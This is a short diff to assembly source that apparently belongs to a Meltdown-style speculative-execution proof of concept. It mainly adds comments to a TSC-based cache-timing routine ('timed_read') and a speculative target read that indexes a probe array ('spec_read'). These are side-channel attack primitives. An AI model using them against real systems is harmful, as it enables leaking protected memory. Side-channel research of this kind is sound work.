@@ -93,14 +93,17 @@ timed_read:
 	mfence
 	lfence
 
+	/* read TSC, combine halves and stash */
 	rdtsc
 	shlq		$32, %rdx
 	orq		%rdx, %rax
 	movq		%rax, %rcx
 
+	/* access our target */
 	movl		(%rdi), %eax
 	lfence
 
+	/* read TSC, combine halves and diff */
 	rdtsc
 	shlq		$32, %rdx
 	orq		%rdx, %rax
@@ -123,14 +126,15 @@ timed_read:
 .global spec_read
 .type	spec_read, @function
 spec_read:
-	xor		%rax, %rax
 	movq		%rdx, %rcx
+	xor		%rax, %rax
 
-1:
-	movb		(%rdi), %al
+	/* attempt to read the target */
+1:	movb		(%rdi), %al
 	testq		%rax, %rax
 	jz		1b
 
+	/* access the appropriate probe */
 	shlq		%cl, %rax
 	movb		(%rax, %rsi, 1), %cl
 
